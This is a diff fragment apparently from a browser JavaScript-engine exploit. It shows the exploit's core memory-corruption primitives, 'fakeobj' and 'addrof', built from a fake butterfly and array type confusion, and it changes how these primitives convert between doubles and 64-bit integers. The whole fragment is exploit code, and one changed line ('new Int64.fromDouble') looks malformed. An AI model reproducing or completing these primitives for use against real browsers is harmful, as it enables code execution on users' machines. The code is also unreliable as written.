@@ -496,12 +496,12 @@ var VM_PROT_EXECUTE = 0x4
             obj.fakeButterfly = b1;
             fakeArr[1] = bigint2float(doubleArrayButterfly);
             fakeobj = (addr) => {
-              a1[0] = bigint2float(addr);
+              a1[0] = new Int64(addr).asDouble();
               return b1[0];
             }
             addrof = (val) => {
               b1[0] = val;
-              return float2bigint(a1[0]);
+              return new Int64.fromDouble(a1[0]);
             }
             port.postMessage("We got stableish addrof and fakeobj");
             
